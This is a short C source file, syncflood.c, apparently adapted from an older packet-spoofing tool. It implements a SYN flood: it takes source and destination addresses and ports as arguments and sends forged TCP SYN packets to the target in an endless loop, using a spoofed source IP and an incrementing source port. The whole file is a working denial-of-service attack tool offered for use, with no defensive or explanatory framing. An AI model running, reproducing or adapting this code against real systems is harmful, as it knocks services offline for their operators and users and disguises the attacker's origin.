/*---=[ syncflood.c ]=---------------------------------------------------*/
/**************************************************************************/
/*        Modified from sniper-rst.c                                       */
/**************************************************************************/
                                                       
#include "spoofit.h"

/* Those 2 'defines' are important for putting the receiving device in  */
/* PROMISCUOUS mode                                                     */    
#define INTERFACE	"eth0" 
#define INTERFACE_PREFIX 14  

char SOURCE[100],DEST[100];
int SOURCE_P,DEST_P;

void main(int argc, char *argv[])
{
int i,stat,j;
int fd_send, fd_receive;
unsigned long sp_ack, sp_seq;
unsigned short flags;
struct sp_wait_packet pinfo;

if(argc != 5)
	{
	printf("usage: %s source_ip source_port dest_ip dest_port\n",argv[0]);
	exit(0);
	}

/* preparing some work */
DEV_PREFIX = INTERFACE_PREFIX;
strcpy(SOURCE,argv[1]);
SOURCE_P=atoi(argv[2]);
strcpy(DEST,argv[3]);
DEST_P=atoi(argv[4]);

/* opening sending and receiving sockets */
fd_send = open_sending();
fd_receive = open_receiving(INTERFACE, IO_NONBLOCK); /* nonblocking IO */

printf("Sending Syn packets\n");
 sp_seq = 2147806712;

for(i=1;;i++)
  {
	transmit_TCP (fd_send, NULL,0,0,0,SOURCE,SOURCE_P++,DEST,DEST_P,
			sp_seq,sp_ack,SYN);
	sp_seq = sp_seq + 200;

  }
}


